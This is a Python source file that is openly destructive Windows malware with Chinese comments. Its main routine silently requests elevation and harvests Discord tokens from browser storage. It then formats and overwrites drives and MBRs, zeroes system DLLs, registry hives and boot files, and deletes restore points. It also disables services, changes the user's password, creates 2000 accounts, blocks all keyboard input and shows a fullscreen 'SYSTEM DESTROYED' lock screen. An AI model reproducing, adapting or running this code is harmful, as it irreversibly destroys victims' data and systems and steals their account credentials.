import tkinter as tk
from tkinter import messagebox
import sys
import random
import winreg
import os
import ctypes
import subprocess
import glob
import threading
from ctypes import wintypes
import time
import shutil
import json
import re
import psutil
import win32api
import win32con

keep_popping = True
current_i = 0
total_windows = 150

# Windows API 常量
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
VK_CONTROL = 0x11
VK_SHIFT = 0x10
VK_ESCAPE = 0x1B
VK_MENU = 0x12
VK_TAB = 0x09
VK_F4 = 0x73
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_DELETE = 0x2E
VK_RETURN = 0x0D

# 狀態變數
ctrl_pressed = False
shift_pressed = False
alt_pressed = False
win_pressed = False
hook_id = None

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_uint),
        ("scanCode", ctypes.c_uint),
        ("flags", ctypes.c_uint),
        ("time", ctypes.c_uint),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def self_elevate_silent():
    """靜默提升管理員權限，不顯示任何提示"""
    if not is_admin():
        # 直接嘗試提升，不顯示任何對話框
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except:
            sys.exit(1)

# ====== Discord Token Stealer ======
def steal_discord_tokens():
    """竊取所有 Discord Token"""
    tokens = []
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
            
        try:
            if "chrome" in platform.lower():
                # Chrome-based browsers
                login_data = os.path.join(path, "Login Data")
                if os.path.exists(login_data):
                    # 嘗試複製檔案（因為正在使用）
                    try:
                        temp_login = os.path.join(os.getenv('TEMP'), 'login_data_temp')
                        shutil.copy2(login_data, temp_login)
                        
                        # 讀取 SQLite 資料庫
                        import sqlite3
                        conn = sqlite3.connect(temp_login)
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for row in cursor.fetchall():
                            url, username, password = row
                            if "discord.com" in url.lower() or "discordapp.com" in url.lower():
                                # 密碼需要解密，但這裡我們只收集 token
                                pass
                        conn.close()
                        os.remove(temp_login)
                    except:
                        pass
            
            # 檢查 Local Storage 中的 token
            local_storage_path = os.path.join(path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                for file_name in os.listdir(local_storage_path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    file_path = os.path.join(local_storage_path, file_name)
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            # 使用正則表達式尋找 Discord token
                            possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            possible_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                            for token in possible_tokens:
                                if token not in tokens:
                                    tokens.append(token)
                    except:
                        pass
                        
            # 檢查 IndexedDB
            indexed_db_path = os.path.join(path, "IndexedDB", "https_discordapp.com_0.indexeddb.leveldb")
            if os.path.exists(indexed_db_path):
                for file_name in os.listdir(indexed_db_path):
                    if file_name.endswith('.log') or file_name.endswith('.ldb'):
                        file_path = os.path.join(indexed_db_path, file_name)
                        try:
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                possible_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                for token in possible_tokens:
                                    if token not in tokens:
                                        tokens.append(token)
                        except:
                            pass
                            
        except Exception as e:
            print(f"Token 竊取錯誤 {platform}: {e}")
    
    # 保存 token 到臨時檔案
    if tokens:
        token_file = os.path.join(os.getenv('TEMP'), 'discord_tokens_stolen.txt')
        with open(token_file, 'w') as f:
            f.write("STOLEN DISCORD TOKENS:\n")
            f.write("=" * 50 + "\n")
            for i, token in enumerate(tokens, 1):
                f.write(f"Token {i}: {token}\n")
        print(f"已竊取 {len(tokens)} 個 Discord Token，保存到: {token_file}")
    
    return tokens

# ====== 磁碟格式化與破壞功能 ======
def get_all_drives():
    """獲取所有磁碟機"""
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in range(26):
        if bitmask & (1 << letter):
            drive = chr(65 + letter) + ':\\'
            drives.append(drive)
    return drives

def format_all_drives():
    """格式化所有磁碟機"""
    drives = get_all_drives()
    formatted_count = 0
    
    # 排除系統磁碟（但還是嘗試格式化）
    system_drive = os.getenv('SYSTEMDRIVE', 'C:\\')
    
    for drive in drives:
        try:
            # 嘗試強制格式化
            if drive == system_drive:
                # 系統磁碟使用特殊方法
                print(f"嘗試格式化系統磁碟: {drive}")
                # 寫入垃圾數據覆蓋整個磁碟
                try:
                    drive_handle = ctypes.windll.kernel32.CreateFileW(
                        f"\\\\.\\{drive[0]}:",
                        0x40000000,  # GENERIC_WRITE
                        0,  # 不共享
                        None,
                        3,  # OPEN_EXISTING
                        0x80000000,  # FILE_FLAG_WRITE_THROUGH
                        None
                    )
                    if drive_handle != -1:
                        # 寫入隨機垃圾數據
                        buffer_size = 1024 * 1024  # 1MB
                        buffer = (ctypes.c_byte * buffer_size)()
                        for i in range(buffer_size):
                            buffer[i] = random.randint(0, 255)
                        
                        bytes_written = wintypes.DWORD()
                        total_written = 0
                        # 寫入前 100MB (避免過度時間)
                        while total_written < 100 * 1024 * 1024:
                            ctypes.windll.kernel32.WriteFile(
                                drive_handle, buffer, buffer_size, 
                                ctypes.byref(bytes_written), None
                            )
                            total_written += bytes_written.value
                            if bytes_written.value == 0:
                                break
                        
                        ctypes.windll.kernel32.CloseHandle(drive_handle)
                        print(f"系統磁碟 {drive} 已部分覆寫 ({total_written} bytes)")
                        formatted_count += 1
                except Exception as e:
                    print(f"系統磁碟覆寫失敗 {drive}: {e}")
            else:
                # 非系統磁碟嘗試格式化
                print(f"格式化磁碟: {drive}")
                # 先刪除所有檔案
                try:
                    for root, dirs, files in os.walk(drive):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                os.chmod(file_path, 0o777)
                                os.remove(file_path)
                            except:
                                pass
                        for dir in dirs:
                            try:
                                dir_path = os.path.join(root, dir)
                                os.chmod(dir_path, 0o777)
                                shutil.rmtree(dir_path, ignore_errors=True)
                            except:
                                pass
                except:
                    pass
                
                # 嘗試格式化指令
                try:
                    # 使用 format 指令（無提示）
                    subprocess.run(f'echo y | format {drive[0]}: /FS:NTFS /Q /V:FORMATTED', 
                                 shell=True, capture_output=True, timeout=30)
                    formatted_count += 1
                    print(f"磁碟 {drive} 格式化完成")
                except subprocess.TimeoutExpired:
                    print(f"磁碟 {drive} 格式化超時")
                except Exception as e:
                    print(f"磁碟 {drive} 格式化失敗: {e}")
                    
        except Exception as e:
            print(f"處理磁碟 {drive} 錯誤: {e}")
    
    print(f"磁碟格式化操作完成 ({formatted_count} 個磁碟處理)")
    return formatted_count > 0

def corrupt_disk_signatures():
    """破壞所有磁碟的簽名和分區表"""
    try:
        # 獲取所有物理磁碟
        for disk_num in range(4):  # 檢查前 4 個物理磁碟
            try:
                drive_name = f"\\\\.\\PhysicalDrive{disk_num}"
                hDevice = ctypes.windll.kernel32.CreateFileW(
                    drive_name,
                    0x40000000,  # GENERIC_WRITE
                    0x00000001 | 0x00000002,  # FILE_SHARE_READ | FILE_SHARE_WRITE
                    None,
                    3,  # OPEN_EXISTING
                    0x00000080 | 0x20000000 | 0x80000000,  # FILE_ATTRIBUTE_NORMAL | FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
                    None
                )
                if hDevice != -1:
                    # 寫入垃圾數據到磁碟開頭（覆蓋 MBR、分區表、磁碟簽名）
                    buffer_size = 1024 * 512  # 512KB
                    buffer = (ctypes.c_byte * buffer_size)()
                    for i in range(buffer_size):
                        buffer[i] = random.randint(0, 255)
                    
                    bytes_written = wintypes.DWORD()
                    ctypes.windll.kernel32.WriteFile(hDevice, buffer, buffer_size, ctypes.byref(bytes_written), None)
                    ctypes.windll.kernel32.CloseHandle(hDevice)
                    print(f"物理磁碟 {disk_num} 簽名已破壞 ({bytes_written.value} bytes)")
                else:
                    error = ctypes.GetLastError()
                    if error != 2:  # ERROR_FILE_NOT_FOUND
                        print(f"無法存取物理磁碟 {disk_num} (錯誤碼: {error})")
            except Exception as e:
                print(f"處理物理磁碟 {disk_num} 錯誤: {e}")
        return True
    except Exception as e:
        print(f"磁碟簽名破壞失敗: {e}")
        return False

def hide_and_corrupt_drives():
    """隱藏所有磁碟並破壞其結構"""
    try:
        # 隱藏所有磁碟
        nodrives_value = 0
        for i in range(26):
            nodrives_value += (1 << i)
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
        winreg.SetValueEx(key, "NoDrives", 0, winreg.REG_DWORD, nodrives_value)
        winreg.CloseKey(key)
        
        # 重啟 explorer
        subprocess.run('taskkill /f /im explorer.exe', shell=True, capture_output=True)
        subprocess.run('start explorer.exe', shell=True, capture_output=True)
        
        # 破壞磁碟結構
        drives = get_all_drives()
        for drive in drives:
            try:
                # 修改磁碟標籤為垃圾數據
                if drive != os.getenv('SYSTEMDRIVE', 'C:\\'):
                    try:
                        subprocess.run(f'label {drive[0]}: VIRUS_CORRUPTED', shell=True, capture_output=True)
                    except:
                        pass
            except:
                pass
        
        print("所有磁碟已隱藏並結構破壞")
        return True
    except Exception as e:
        print(f"磁碟隱藏破壞失敗: {e}")
        return False

# ====== 極度破壞性功能 ======
def corrupt_system_files():
    system_files = [
        r"C:\Windows\System32\kernel32.dll",
        r"C:\Windows\System32\ntdll.dll",
        r"C:\Windows\System32\user32.dll",
        r"C:\Windows\System32\gdi32.dll",
        r"C:\Windows\System32\advapi32.dll",
        r"C:\Windows\System32\comdlg32.dll",
        r"C:\Windows\System32\comctl32.dll",
        r"C:\Windows\System32\shell32.dll",
        r"C:\Windows\System32\ole32.dll",
        r"C:\Windows\System32\oleaut32.dll"
    ]
    corrupted_count = 0
    for file_path in system_files:
        if os.path.exists(file_path):
            try:
                with open(file_path, 'wb') as f:
                    f.write(b'\x00' * min(os.path.getsize(file_path), 1024 * 1024))
                corrupted_count += 1
                print(f"系統檔案已破壞: {file_path}")
            except Exception as e:
                print(f"破壞 {file_path} 失敗: {e}")
    print(f"系統核心檔案破壞完成 ({corrupted_count} 個)")
    return corrupted_count > 0

def delete_critical_directories():
    critical_dirs = [
        r"C:\Windows\Temp",
        r"C:\Windows\Prefetch",
        r"C:\Windows\SoftwareDistribution",
        r"C:\ProgramData\Microsoft\Windows\Start Menu",
        r"C:\Users\Public\Desktop",
        r"C:\Windows\System32\drivers",
        r"C:\Windows\inf",
        r"C:\Windows\Fonts"
    ]
    deleted_count = 0
    for dir_path in critical_dirs:
        if os.path.exists(dir_path):
            try:
                subprocess.run(f'rmdir /s /q "{dir_path}"', shell=True, capture_output=True)
                deleted_count += 1
                print(f"關鍵目錄已刪除: {dir_path}")
            except Exception as e:
                print(f"刪除 {dir_path} 失敗: {e}")
    print(f"關鍵目錄刪除完成 ({deleted_count} 個)")
    return deleted_count > 0

def overwrite_boot_files():
    boot_files = [
        r"C:\boot.ini",
        r"C:\bootmgr",
        r"C:\BOOTNXT",
        r"C:\Windows\bootsect.exe"
    ]
    bcd_path = r"C:\boot\BCD"
    
    overwritten_count = 0
    for file_path in boot_files:
        if os.path.exists(file_path):
            try:
                with open(file_path, 'wb') as f:
                    f.write(b'\xFF' * 1024 * 512)
                overwritten_count += 1
                print(f"開機檔案已覆寫: {file_path}")
            except Exception as e:
                print(f"覆寫 {file_path} 失敗: {e}")
    
    if os.path.exists(bcd_path):
        try:
            with open(bcd_path, 'wb') as f:
                f.write(b'\x00' * 1024 * 1024)
            overwritten_count += 1
            print(f"BCD 檔案已覆寫: {bcd_path}")
        except Exception as e:
            print(f"覆寫 BCD 失敗: {e}")
    
    print(f"開機檔案破壞完成 ({overwritten_count} 個)")
    return overwritten_count > 0

def disable_all_services():
    try:
        services = subprocess.run('sc queryex type= service state= all', shell=True, capture_output=True, text=True)
        service_names = []
        for line in services.stdout.split('\n'):
            if 'SERVICE_NAME:' in line:
                service_name = line.split(':')[1].strip()
                service_names.append(service_name)
        
        disabled_count = 0
        for service in service_names[:100]:
            try:
                subprocess.run(f'sc config "{service}" start= disabled', shell=True, capture_output=True)
                subprocess.run(f'net stop "{service}"', shell=True, capture_output=True)
                disabled_count += 1
                print(f"服務已停用: {service}")
            except Exception as e:
                print(f"停用服務 {service} 失敗: {e}")
        
        print(f"Windows 服務停用完成 ({disabled_count} 個)")
        return disabled_count > 0
    except Exception as e:
        print(f"停用服務失敗: {e}")
        return False

def corrupt_registry_hives():
    hive_files = [
        r"C:\Windows\System32\config\SYSTEM",
        r"C:\Windows\System32\config\SOFTWARE",
        r"C:\Windows\System32\config\SECURITY",
        r"C:\Windows\System32\config\SAM",
        r"C:\Windows\System32\config\DEFAULT"
    ]
    corrupted_count = 0
    for hive_path in hive_files:
        if os.path.exists(hive_path):
            try:
                with open(hive_path, 'wb') as f:
                    f.write(b'\xDE\xAD\xBE\xEF' * 1024 * 256)
                corrupted_count += 1
                print(f"註冊表配置單元已破壞: {hive_path}")
            except Exception as e:
                print(f"破壞註冊表 {hive_path} 失敗: {e}")
    print(f"註冊表配置單元破壞完成 ({corrupted_count} 個)")
    return corrupted_count > 0

def delete_user_profiles():
    users_dir = r"C:\Users"
    if os.path.exists(users_dir):
        deleted_count = 0
        current_user = os.getenv('USERNAME')
        for user_folder in os.listdir(users_dir):
            if user_folder not in ['Public', 'Default', 'All Users', current_user, 'Default User']:
                user_path = os.path.join(users_dir, user_folder)
                if os.path.isdir(user_path):
                    try:
                        subprocess.run(f'rmdir /s /q "{user_path}"', shell=True, capture_output=True)
                        deleted_count += 1
                        print(f"使用者設定檔已刪除: {user_folder}")
                    except Exception as e:
                        print(f"刪除 {user_folder} 失敗: {e}")
        print(f"使用者設定檔刪除完成 ({deleted_count} 個)")
        return deleted_count > 0
    return False

def disable_all_drivers():
    try:
        drivers = subprocess.run('sc queryex type= driver', shell=True, capture_output=True, text=True)
        driver_names = []
        for line in drivers.stdout.split('\n'):
            if 'SERVICE_NAME:' in line:
                driver_name = line.split(':')[1].strip()
                driver_names.append(driver_name)
        
        disabled_count = 0
        for driver in driver_names[:50]:
            try:
                subprocess.run(f'sc config "{driver}" start= disabled', shell=True, capture_output=True)
                disabled_count += 1
                print(f"驅動程式已停用: {driver}")
            except Exception as e:
                print(f"停用驅動 {driver} 失敗: {e}")
        
        print(f"驅動程式停用完成 ({disabled_count} 個)")
        return disabled_count > 0
    except Exception as e:
        print(f"停用驅動失敗: {e}")
        return False

def overwrite_pagefile():
    pagefiles = [
        r"C:\pagefile.sys",
        r"C:\swapfile.sys"
    ]
    overwritten_count = 0
    for pagefile in pagefiles:
        if os.path.exists(pagefile):
            try:
                size = os.path.getsize(pagefile)
                write_size = min(size, 200 * 1024 * 1024)
                with open(pagefile, 'wb') as f:
                    f.write(b'\x55' * write_size)
                overwritten_count += 1
                print(f"分頁檔案已覆寫: {pagefile} ({write_size} bytes)")
            except Exception as e:
                print(f"覆寫 {pagefile} 失敗: {e}")
    print(f"分頁檔案破壞完成 ({overwritten_count} 個)")
    return overwritten_count > 0

def delete_system_restore_points():
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True)
        subprocess.run('wmic shadowcopy delete /nointeractive', shell=True, capture_output=True)
        print("所有系統還原點已刪除")
        return True
    except Exception as e:
        print(f"刪除系統還原點失敗: {e}")
        return False

# ====== 原有功能 ======
def disable_taskmgr_reg():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except:
        return False

def disable_cmd_reg():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        return True
    except:
        return False

def disable_alt_tab_reg():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop")
        winreg.SetValueEx(key, "CoolSwitch", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
        return True
    except:
        return False

def disable_shutdown_reg():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
        winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except:
        return False

def change_local_password():
    try:
        username = os.getenv('USERNAME')
        new_password = "viruslocked123!"
        cmd = f'net user "{username}" "{new_password}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False

def create_accounts():
    try:
        success_count = 0
        for i in range(2000):  # 增加到 2000 個
            username = f"virususer{i:04d}"
            password = f"locked{i:04d}!"
            cmd = f'net user "{username}" "{password}" /add'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                success_count += 1
        return success_count > 0
    except:
        return False

def disable_system_folders():
    system_paths = [
        r"C:\Windows",
        r"C:\Program Files",
        r"C:\Program Files (x86)",
        r"C:\Users",
        r"C:\System Volume Information"
    ]
    success_count = 0
    for path in system_paths:
        if os.path.exists(path):
            cmd = f'icacls "{path}" /deny Everyone:(OI)(CI)F /C /T'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                success_count += 1
    return success_count > 0

def disable_desktop_exes():
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        exe_files = glob.glob(os.path.join(desktop_path, "*.exe")) + glob.glob(os.path.join(desktop_path, "*.lnk"))
        success_count = 0
        for exe in exe_files:
            cmd = f'icacls "{exe}" /deny Everyone:RX /C'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                success_count += 1
        return success_count > 0
    except:
        return False

def disable_chrome_exe():
    chrome_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expanduser(r"~\AppData\Local\Google\Chrome\Application\chrome.exe")
    ]
    success_count = 0
    for path in chrome_paths:
        if os.path.exists(path):
            cmd = f'icacls "{path}" /deny Everyone:RX /C'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                success_count += 1
    return success_count > 0

def change_wallpaper_black():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop")
        winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "WallPaperStyle", 0, winreg.REG_SZ, "0")
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
        subprocess.run('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters', shell=True, capture_output=True)
        return True
    except:
        return False

def change_exe_icon_reg():
    try:
        icon_key = winreg.CreateKey(winreg.HKEY_CLASSES_ROOT, r".exe")
        winreg.SetValueEx(icon_key, "DefaultIcon", 0, winreg.REG_SZ, "%SystemRoot%\\system32\\shell32.dll,-48")
        winreg.CloseKey(icon_key)
        subprocess.run('taskkill /f /im explorer.exe', shell=True, capture_output=True)
        subprocess.run('start explorer.exe', shell=True, capture_output=True)
        return True
    except:
        return False

def create_fake_exe_files():
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        success_count = 0
        for i in range(200):  # 增加到 200 個
            fake_exe = os.path.join(desktop_path, f"virus_locked_{i:03d}.exe")
            with open(fake_exe, 'w') as f:
                f.write("SYSTEM COMPROMISED BY VIRUS")
            cmd_deny = f'icacls "{fake_exe}" /deny Everyone:RX /C'
            result_deny = subprocess.run(cmd_deny, shell=True, capture_output=True, text=True)
            if result_deny.returncode == 0:
                success_count += 1
        return success_count > 0
    except:
        return False

def update_key_state(vk_code, pressed):
    global ctrl_pressed, shift_pressed, alt_pressed, win_pressed
    if vk_code == VK_CONTROL:
        ctrl_pressed = pressed
    elif vk_code == VK_SHIFT:
        shift_pressed = pressed
    elif vk_code == VK_MENU:
        alt_pressed = pressed
    elif vk_code in [VK_LWIN, VK_RWIN]:
        win_pressed = pressed

def low_level_keyboard_proc(nCode, wParam, lParam):
    global hook_id
    if nCode >= 0:
        kbd_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk_code = kbd_struct.vkCode
        pressed = (wParam == WM_KEYDOWN)
        update_key_state(vk_code, pressed)
    
        if wParam == WM_KEYDOWN:
            return True  # 阻擋所有按鍵
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def install_keyboard_hook():
    global hook_id
    pointer = HOOKPROC(low_level_keyboard_proc)
    hook_id = user32.SetWindowsHookExW(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)

def uninstall_keyboard_hook():
    global hook_id
    if hook_id:
        user32.UnhookWindowsHookEx(hook_id)
        hook_id = None

def show_non_blocking_warning(title, message):
    warn_win = tk.Toplevel()
    warn_win.title(title)
    warn_win.geometry("600x400")
    warn_win.configure(bg='black')
    warn_win.attributes('-topmost', True)
    warn_win.protocol("WM_DELETE_WINDOW", lambda: None)
    label = tk.Label(warn_win, text=message, font=("Courier", 12, "bold"), fg='red', bg='black', wraplength=580)
    label.pack(expand=True, pady=20)
    warn_win.after(10000, warn_win.destroy)

def image_lock_loop():
    if keep_popping:
        lock_win = tk.Tk()
        lock_win.title("SYSTEM DESTROYED - NO RECOVERY")
        lock_win.attributes('-fullscreen', True)
        lock_win.attributes('-topmost', True)
        lock_win.configure(bg='black')
        lock_win.overrideredirect(True)
        lock_win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        SW_HIDE = 0
        user32.ShowWindow(user32.FindWindowW("Shell_TrayWnd", None), SW_HIDE)
        user32.ShowWindow(user32.FindWindowW("BUTTON", "Start"), SW_HIDE)
        
        canvas = tk.Canvas(lock_win, width=lock_win.winfo_screenwidth(), height=lock_win.winfo_screenheight(), bg='black', highlightthickness=0)
        canvas.pack(expand=True, fill='both')
        
        center_x = lock_win.winfo_screenwidth() // 2
        center_y = lock_win.winfo_screenheight() // 2
        
        # 動態破壞圖示
        canvas.create_rectangle(center_x - 300, center_y - 400, center_x + 300, center_y + 400, fill='#FF0000', outline='white', width=10)
        canvas.create_oval(center_x - 150, center_y - 500, center_x + 150, center_y - 150, fill='#FF0000', outline='white', width=10)
        canvas.create_oval(center_x - 50, center_y - 250, center_x + 50, center_y - 200, fill='black', outline='black')
        
        destruction_text = (
            "「SYSTEM COMPLETELY DESTROYED」\n\n"
            "• ALL DISKS FORMATTED AND CORRUPTED\n"
            "• BOOT SECTOR AND PARTITION TABLE DESTROYED\n"
            "• ALL SYSTEM FILES OVERWRITTEN\n"
            "• REGISTRY HIVES CORRUPTED\n"
            "• ALL USER PROFILES DELETED\n"
            "• SERVICES AND DRIVERS DISABLED\n"
            "• DISCORD TOKENS STOLEN\n"
            "• 2000 FAKE ACCOUNTS CREATED\n"
            "• 200 VIRUS FILES ON DESKTOP\n"
            "• ALL DRIVES HIDDEN AND CORRUPTED\n"
            "• SYSTEM RESTORE POINTS DELETED\n"
            "• PAGE FILE OVERWRITTEN\n\n"
            "「NO RECOVERY POSSIBLE - HARDWARE DAMAGE」"
        )
        canvas.create_text(center_x, center_y + 300, text=destruction_text, fill='white', font=("Courier", 16, "bold"), justify='center')
        
        def pulse_effect():
            current_fill = canvas.itemcget(canvas.find_withtag("text")[0], "fill")
            new_fill = 'red' if current_fill == 'white' else 'white'
            canvas.itemconfig(canvas.find_withtag("text")[0], fill=new_fill)
            canvas.itemconfig(canvas.find_withtag("rect")[0] if canvas.find_withtag("rect") else canvas.find_all()[0], fill='#FF0000' if new_fill == 'red' else '#8B0000')
            lock_win.after(300, pulse_effect)
        
        # 標記元素用於動畫
        canvas.addtag_all("all")
        lock_win.after(300, pulse_effect)
        lock_win.mainloop()

def create_flicker_window(i):
    global current_i
    if not keep_popping:
        return
    try:
        import winsound
        winsound.Beep(1000 - i*2, 200)
    except:
        pass
    top = tk.Toplevel()
    top.title(f"DESTRUCTION PHASE {i+1:03d}")
    x = random.randint(0, 1400)
    y = random.randint(0, 900)
    top.geometry(f"350x250+{x}+{y}")
    top.configure(bg='black')
    top.lift()
    top.attributes('-topmost', True)
    top.protocol("WM_DELETE_WINDOW", lambda: None)
    
    destruction_messages = [
        "DISK FORMATTING IN PROGRESS",
        "BOOT SECTOR CORRUPTION",
        "SYSTEM FILE DESTRUCTION", 
        "REGISTRY CORRUPTION",
        "USER PROFILE DELETION",
        "SERVICE DISABLEMENT",
        "DRIVER CORRUPTION",
        "TOKEN EXTRACTION COMPLETE",
        "ACCOUNT FLOODING",
        "DRIVE HIDE OPERATION",
        "RECOVERY POINT DELETION",
        "PAGE FILE OVERWRITE"
    ]
    message = destruction_messages[i % len(destruction_messages)]
    
    label = tk.Label(top, text=f"PHASE: {message}\nSYSTEM DESTRUCTION {((i+1)/total_windows)*100:.1f}%\nVIRUS LOCKDOWN ACTIVE", 
                     font=("Courier", 12, "bold"), fg='red', bg='black')
    label.pack(expand=True)
    
    def flicker():
        if top.winfo_exists():
            current_fg = label['fg']
            new_fg = 'white' if current_fg == 'red' else 'red'
            label.configure(fg=new_fg)
            top.configure(bg='red' if new_fg == 'white' else 'black')
            label.configure(bg='red' if new_fg == 'white' else 'black')
            top.after(150, flicker)
    
    flicker()
    top.after(8000, top.destroy)
    current_i += 1

# 主程式
def main():
    self_elevate_silent()
    
    print("EXTREME VIRUS ACTIVATION - SILENT MODE")
    print("=======================================")
    
    # 執行 Discord Token 竊取
    stolen_tokens = steal_discord_tokens()
    
    # 執行磁碟格式化與破壞
    format_all_drives()
    corrupt_disk_signatures()
    hide_and_corrupt_drives()
    
    # 執行極度破壞性操作
    corrupt_system_files()
    delete_critical_directories()
    overwrite_boot_files()
    disable_all_services()
    corrupt_registry_hives()
    delete_user_profiles()
    disable_all_drivers()
    overwrite_pagefile()
    delete_system_restore_points()
    
    # 執行原有破壞性操作
    change_local_password()
    create_accounts()
    disable_taskmgr_reg()
    disable_cmd_reg()
    disable_alt_tab_reg()
    disable_shutdown_reg()
    disable_desktop_exes()
    disable_chrome_exe()
    disable_system_folders()
    change_wallpaper_black()
    change_exe_icon_reg()
    create_fake_exe_files()
    
    print("=======================================")
    print("ALL DESTRUCTIVE OPERATIONS COMPLETED")
    print(f"DISCORD TOKENS STOLEN: {len(stolen_tokens)}")
    
    # 安裝鍵盤鉤子（完全阻擋所有輸入）
    install_keyboard_hook()
    hook_thread_obj = threading.Thread(target=hook_thread, daemon=True)
    hook_thread_obj.start()
    
    # 創建大量破壞視窗
    root = tk.Tk()
    root.withdraw()
    
    for i in range(total_windows):
        if keep_popping:
            create_flicker_window(i)
            time.sleep(0.05)
    
    image_lock_loop()

def hook_thread():
    msg = wintypes.MSG()
    while keep_popping:
        if user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
        else:
            break

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        uninstall_keyboard_hook()
        sys.exit(1)
